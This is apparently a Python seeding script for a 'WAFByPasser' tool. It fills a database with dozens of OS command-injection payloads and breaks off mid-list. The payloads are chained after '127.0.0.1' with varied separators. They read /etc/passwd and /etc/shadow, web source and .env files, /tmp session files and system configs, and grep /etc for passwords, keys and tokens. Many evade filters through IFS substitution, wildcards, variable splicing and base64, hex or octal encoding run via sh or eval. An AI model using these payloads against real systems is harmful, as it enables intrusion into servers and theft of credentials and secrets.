"""
Insert file-read command injection payloads into WAFByPasser payload library.

Based on 4 core file-reading patterns, expanded with multiple variants:
1. 系统账户文件读取 — /etc/passwd, /etc/shadow
2. Web 源码文件查找 — /var/www *.php
3. 临时文件读取 — /tmp -type f
4. 配置文件遍历 — /etc *.conf

Each pattern has variants with different separators, commands, encoding bypasses,
and progressively higher difficulty levels.
"""

from __future__ import annotations

import sqlite3
import uuid
from pathlib import Path

DB_PATH = Path(__file__).resolve().parents[1] / "data" / "waf_bypasser.db"


def connect() -> sqlite3.Connection:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(DB_PATH), timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON")
    return conn


def existing_keys(conn: sqlite3.Connection) -> set[tuple[str, str]]:
    rows = conn.execute(
        "SELECT name, target FROM payloads WHERE is_pool_snapshot = 0"
    ).fetchall()
    return {(r["name"], r["target"]) for r in rows}


def existing_contents(conn: sqlite3.Connection) -> set[tuple[str, str, str]]:
    rows = conn.execute(
        "SELECT vulnerability, target, content FROM payloads WHERE is_pool_snapshot = 0"
    ).fetchall()
    return {(r["vulnerability"], r["target"], r["content"]) for r in rows}


def insert_payload(
    conn: sqlite3.Connection,
    seen_names: set[tuple[str, str]],
    seen_contents: set[tuple[str, str, str]],
    name: str,
    vulnerability: str,
    category: str,
    delivery: str,
    target: str,
    difficulty: str,
    content: str,
) -> bool:
    if len(name) > 64:
        raise ValueError(f"name too long ({len(name)}): {name}")
    if len(content) > 5000:
        raise ValueError(f"content too long ({len(content)}): {name}")
    key = (name, target)
    ckey = (vulnerability, target, content)
    if key in seen_names:
        print(f"  [SKIP name] {name}")
        return False
    if ckey in seen_contents:
        print(f"  [SKIP content] {name}")
        return False
    conn.execute(
        """
        INSERT INTO payloads (
            id, name, vulnerability, category, delivery, target, difficulty,
            content, usage_method, success_indicators, created_at,
            archived_from_candidate_id, is_pool_snapshot, is_deleted
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, '', '', ?, NULL, 0, 0)
        """,
        (
            str(uuid.uuid4()),
            name,
            vulnerability,
            category,
            delivery,
            target,
            difficulty,
            content,
            "靶场已验证",
        ),
    )
    seen_names.add(key)
    seen_contents.add(ckey)
    print(f"  [OK] {name}")
    return True


# ============================================================================
# Group 1: 系统账户文件读取 — /etc/passwd, /etc/shadow
# Base: 127.0.0.1; grep "root" /etc/passwd 2>/dev/null
# ============================================================================
PASSWD_READ_PAYLOADS = [
    # ---- 基础级：不同分隔符 + cat/grep 直接读取 ----
    (
        "文件读取 · 通用 · 分号cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 管道cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1 | cat /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · OR链cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1 || cat /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · AND链cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1 && cat /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 后台执行cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1 & cat /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 美元括号cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1 $(cat /etc/passwd 2>/dev/null)",
    ),
    (
        "文件读取 · 通用 · 反引号cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1 `cat /etc/passwd 2>/dev/null`",
    ),
    (
        "文件读取 · 通用 · 换行cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1\ncat /etc/passwd 2>/dev/null",
    ),
    # ---- 基础级：不同命令读取 passwd ----
    (
        "文件读取 · 通用 · grep root /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; grep "root" /etc/passwd 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · awk 读取 /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; awk '/root/' /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · sed 读取 /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; sed -n '/root/p' /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · head 读取 /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; head -5 /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · tail 读取 /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; tail -5 /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · while read /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; while read l;do echo $l;done</etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · nl 行号 /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; nl /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cut 提取 /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cut -d: -f1 /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · sort /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; sort /etc/passwd 2>/dev/null",
    ),
    # ---- 基础级：shadow 文件读取（需要 root）----
    (
        "文件读取 · 通用 · cat /etc/shadow",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/shadow 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 读取 /etc/group",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/group 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 读取 /etc/hosts",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/hosts 2>/dev/null",
    ),
    # ---- 中等级：IFS / 通配符 / 变量间接绕过 ----
    (
        "文件读取 · 通用 · IFS空格cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;cat${IFS}/etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 通配符cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;/bin/c?t${IFS}/etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 变量拼接cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;a=c;b=at;$a$b${IFS}/etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 花括号cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;{cat,/etc/passwd,;} 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 子shell cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;(cat${IFS}/etc/passwd) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · here-string读取passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;cat<<</etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 大小写cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;$(tr 'A-Z' 'a-z'<<<'CAT /ETC/PASSWD'|sh) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 全路径cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;/bin/cat /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · xargs读取passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;echo /etc/passwd|xargs cat 2>/dev/null",
    ),
    # ---- 高级：编码/转义绕过 ----
    (
        "文件读取 · 通用 · base64 cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · hex转义cat /etc/passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$'\143\141\164'${IFS}/etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · printf八进制cat passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$(printf '\\143\\141\\164 /etc/passwd'|sh) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · xxd解码cat passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$(echo 636174202f6574632f706173737764|xxd -r -p|sh) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · eval+base64cat passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;eval $(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · URL编码换行cat passwd",
        "command-injection",
        "系统文件读取",
        "URL查询参数",
        "通用",
        "高级",
        "127.0.0.1%0acat /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · printf花括号cat passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1%0a{printf,'%s','cat /etc/passwd'}|sh 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 环境变量PATH cat passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$(PATH=/bin:/usr/bin;which cat) /etc/passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 复合IFS+变量cat passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;a=ca;b=t;IFS=/;$a$b${IFS}etc${IFS}passwd 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 制表符空格cat passwd",
        "command-injection",
        "系统文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;cat\t/etc/passwd 2>/dev/null",
    ),
]

# ============================================================================
# Group 2: Web 源码文件查找 — /var/www *.php, *.asp, *.jsp etc.
# Base: 127.0.0.1; find /var/www -name "*.php" | xargs cat 2>/dev/null
# ============================================================================
WEB_SOURCE_PAYLOADS = [
    # ---- 基础级：不同分隔符 + find PHP ----
    (
        "文件读取 · 通用 · find PHP源码 xargs方式",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name "*.php" | xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find PHP源码 exec方式",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name "*.php" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find PHP源码 exec+方式",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name "*.php" -exec cat {} + 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · 管道符find PHP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1 | find /var/www -name "*.php" | xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · AND链find PHP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1 && find /var/www -name "*.php" | xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · grep递归PHP标签",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; grep -r "<?php" /var/www 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · grep递归输出文件名",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; grep -rl "config" /var/www 2>/dev/null',
    ),
    # ---- 基础级：不同 Web 根目录 ----
    (
        "文件读取 · 通用 · find /var/www/html PHP",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www/html -name "*.php" | xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /opt/app PHP",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /opt -name "*.php" | xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /usr/share/nginx PHP",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /usr/share/nginx -name "*.php" 2>/dev/null | xargs cat',
    ),
    # ---- 基础级：不同源码类型 ----
    (
        "文件读取 · 通用 · find ASP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name "*.asp" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find JSP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name "*.jsp" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find PY源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name "*.py" | xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find 配置文件config.php",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name "config.php" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find .env文件",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name ".env" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find .inc包含文件",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www -name "*.inc" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find多类型PHP+ASP+JSP",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /var/www \\( -name "*.php" -o -name "*.asp" -o -name "*.jsp" \\) -exec cat {} \\; 2>/dev/null',
    ),
    # ---- 中等级：IFS/通配符/变量绕过 ----
    (
        "文件读取 · 通用 · IFS find PHP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;find${IFS}/var/www${IFS}-name${IFS}"*.php"${IFS}|${IFS}xargs${IFS}cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · 变量拼接find命令",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;a=find;b=xargs;$a /var/www -name "*.php"|$b cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · 全路径find PHP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;/usr/bin/find /var/www -name "*.php" -exec /bin/cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · 子shell find PHP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;(find /var/www -name "*.php"|xargs cat) 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · 花括号find PHP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;{find,/var/www,-name,"*.php",-exec,cat,{},;,} 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · grep -r 多扩展名",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;grep${IFS}-r${IFS}include${IFS}/var/www 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · locate PHP文件",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;locate .php 2>/dev/null|xargs cat 2>/dev/null",
    ),
    # ---- 高级：编码/深层绕过 ----
    (
        "文件读取 · 通用 · base64 find PHP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;$(echo ZmluZCAvdmFyL3d3dyAtbmFtZSAiKi5waHAiIC1leGVjIGNhdCB7fSBcOw==|base64 -d|sh) 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · hex find PHP源码",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;$"\\146\\151\\156\\144" /var/www -name "*.php"|xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · 复合IFS+通配符find PHP",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;/usr/bin/f?nd${IFS}/var/www${IFS}-name${IFS}*.php${IFS}-exec${IFS}/bin/c?t${IFS}{}${IFS}\\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · eval+base64 find PHP",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;eval $(echo ZmluZCAvdmFyL3d3dyAtbmFtZSAiKi5waHAiIC1leGVjIGNhdCB7fSBcOw==|base64 -d) 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · for循环遍历PHP文件",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;for f in $(find /var/www -name "*.php" 2>/dev/null);do cat $f 2>/dev/null;done',
    ),
    (
        "文件读取 · 通用 · while读取find PHP结果",
        "command-injection",
        "Web源码读取",
        "表单字段",
        "通用",
        "高级",
        '127.0.0.1;find /var/www -name "*.php" 2>/dev/null|while read f;do cat "$f" 2>/dev/null;done',
    ),
]

# ============================================================================
# Group 3: 临时文件读取 — /tmp, /var/tmp, /dev/shm
# Base: 127.0.0.1; find /tmp -type f -exec cat {} \; 2>/dev/null
# ============================================================================
TMP_READ_PAYLOADS = [
    # ---- 基础级：不同分隔符 + find /tmp ----
    (
        "文件读取 · 通用 · find /tmp exec方式",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; find /tmp -type f -exec cat {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · find /tmp xargs方式",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; find /tmp -type f | xargs cat 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 管道find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1 | find /tmp -type f -exec cat {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · ls + cat /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; ls /tmp/* 2>/dev/null | xargs cat 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · for循环/tmp文件",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; for f in /tmp/*; do cat $f 2>/dev/null; done",
    ),
    # ---- 基础级：不同临时目录 ----
    (
        "文件读取 · 通用 · find /var/tmp 文件",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; find /var/tmp -type f -exec cat {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · find /dev/shm 文件",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; find /dev/shm -type f -exec cat {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · find /tmp 日志文件",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /tmp -name "*.log" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /tmp 文本文件",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /tmp -name "*.txt" | xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /tmp 最近修改文件",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; find /tmp -type f -mmin -60 | xargs cat 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · find /tmp session文件",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /tmp -name "sess_*" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /tmp PHP上传文件",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /tmp -name "php*" -exec cat {} \\; 2>/dev/null',
    ),
    # ---- 中等级：IFS/通配符/变量绕过 ----
    (
        "文件读取 · 通用 · IFS find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;find${IFS}/tmp${IFS}-type${IFS}f${IFS}-exec${IFS}cat${IFS}{}${IFS}\\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 全路径find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;/usr/bin/find /tmp -type f -exec /bin/cat {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 变量拼接find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;a=find;b=cat;$a /tmp -type f -exec $b {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 通配符find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;/usr/bin/f?nd /t?p -type f -exec /bin/c?t {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · while find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;find /tmp -type f 2>/dev/null|while read f;do cat "$f" 2>/dev/null;done',
    ),
    (
        "文件读取 · 通用 · xargs -n1 cat /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1;find /tmp -type f 2>/dev/null|xargs -n1 cat 2>/dev/null",
    ),
    # ---- 高级：编码/多目录组合 ----
    (
        "文件读取 · 通用 · 多临时目录合并查找",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;find /tmp /var/tmp /dev/shm -type f 2>/dev/null|head -20|xargs cat 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · base64 find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;$(echo ZmluZCAvdG1wIC10eXBlIGYgLWV4ZWMgY2F0IHt9IFw7|base64 -d|sh) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · 复合IFS+通配符find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;f?nd${IFS}/t?p${IFS}-type${IFS}f${IFS}-exec${IFS}c?t${IFS}{}${IFS}\\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · eval find /tmp",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;eval $(echo ZmluZCAvdG1wIC10eXBlIGYgLWV4ZWMgY2F0IHt9IFw7|base64 -d) 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · head限制find/tmp输出",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;find /tmp -type f -exec head -c 200 {} \\; 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · strings /tmp二进制",
        "command-injection",
        "临时文件读取",
        "表单字段",
        "通用",
        "高级",
        "127.0.0.1;find /tmp -type f -exec strings {} \\; 2>/dev/null",
    ),
]

# ============================================================================
# Group 4: 配置文件遍历 — /etc *.conf, *.ini, *.cnf etc.
# Base: 127.0.0.1; for f in $(find /etc -name "*.conf"); do cat $f; done 2>/dev/null
# ============================================================================
CONF_READ_PAYLOADS = [
    # ---- 基础级：不同分隔符 + for循环配置 ----
    (
        "文件读取 · 通用 · for循环读取.conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; for f in $(find /etc -name "*.conf"); do cat $f; done 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find exec读取.conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc -name "*.conf" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find xargs读取.conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc -name "*.conf" | xargs cat 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · while read读取.conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc -name "*.conf" 2>/dev/null | while read f; do cat "$f" 2>/dev/null; done',
    ),
    # ---- 基础级：不同配置文件类型 ----
    (
        "文件读取 · 通用 · find /etc *.ini",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc -name "*.ini" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /etc *.cnf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc -name "*.cnf" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /etc *.yml+yaml",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc \\( -name "*.yml" -o -name "*.yaml" \\) -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /etc *.cfg",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc -name "*.cfg" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /etc *.env",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc -name "*.env" -exec cat {} \\; 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · find /etc 所有配置文件",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        '127.0.0.1; find /etc \\( -name "*.conf" -o -name "*.ini" -o -name "*.cnf" -o -name "*.cfg" \\) -exec cat {} \\; 2>/dev/null',
    ),
    # ---- 基础级：重点敏感配置单文件 ----
    (
        "文件读取 · 通用 · cat /etc/nginx/nginx.conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/nginx/nginx.conf 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat /etc/apache2/apache2.conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/apache2/apache2.conf 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat /etc/my.cnf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/my.cnf 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat /etc/php/php.ini",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/php/php.ini 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat /etc/redis/redis.conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/redis/redis.conf 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · cat /etc/ssh/sshd_config",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "基础",
        "127.0.0.1; cat /etc/ssh/sshd_config 2>/dev/null",
    ),
    # ---- 中等级：合并关键信息/单行读取 ----
    (
        "文件读取 · 通用 · 合并passwd+shadow+hosts",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "中等",
        "127.0.0.1; find /etc -name passwd -o -name shadow -o -name hosts | xargs cat 2>/dev/null",
    ),
    (
        "文件读取 · 通用 · grep递归提取/etc密码",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1; grep -r "password" /etc 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · grep递归提取/etc密钥",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1; grep -rE "(secret|key|token|api)" /etc 2>/dev/null',
    ),
    (
        "文件读取 · 通用 · IFS for循环读取conf",
        "command-injection",
        "配置文件读取",
        "表单字段",
        "通用",
        "中等",
        '127.0.0.1;for${IFS}f${IFS}in${IFS}$(find${IFS}/etc${IFS}-name${IFS}"*.conf");do${IFS}cat${IFS}$f;done 2>/dev/null',
    ),
    (
